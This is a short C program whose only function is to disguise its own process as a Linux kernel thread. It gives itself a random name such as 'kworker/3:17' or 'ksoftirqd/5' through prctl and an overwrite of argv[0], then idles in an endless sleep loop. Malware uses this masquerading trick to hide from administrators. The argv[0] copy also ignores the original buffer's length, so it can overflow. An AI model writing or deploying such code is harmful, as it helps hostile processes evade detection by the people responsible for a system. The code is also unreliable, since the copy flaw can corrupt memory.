#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/prctl.h>

void generate_fake_name(char *buf, size_t len) {
    srand(time(NULL) ^ getpid()); // random seed per PID
    int type = rand() % 5;
    int cpu = rand() % 16;
    int id = rand() % 100;

    switch (type) {
        case 0:
            snprintf(buf, len, "kworker/%d:%d", cpu, id);
            break;
        case 1:
            snprintf(buf, len, "migration/%d", cpu);
            break;
        case 2:
            snprintf(buf, len, "watchdog/%d", cpu);
            break;
        case 3:
            snprintf(buf, len, "ksoftirqd/%d", cpu);
            break;
        case 4:
            snprintf(buf, len, "flush-%d:%d", rand() % 10, rand() % 256);
            break;
        default:
            strncpy(buf, "khelper", len);
    }
}

int main(int argc, char *argv[])
{
    char fake_name[64];
    generate_fake_name(fake_name, sizeof(fake_name));

    prctl(PR_SET_NAME, fake_name);

    memset(argv[0], 0, strlen(argv[0]));
    strncpy(argv[0], fake_name, strlen(fake_name));
    
    while (1) {
        sleep(60);
    }

    return 0;
}
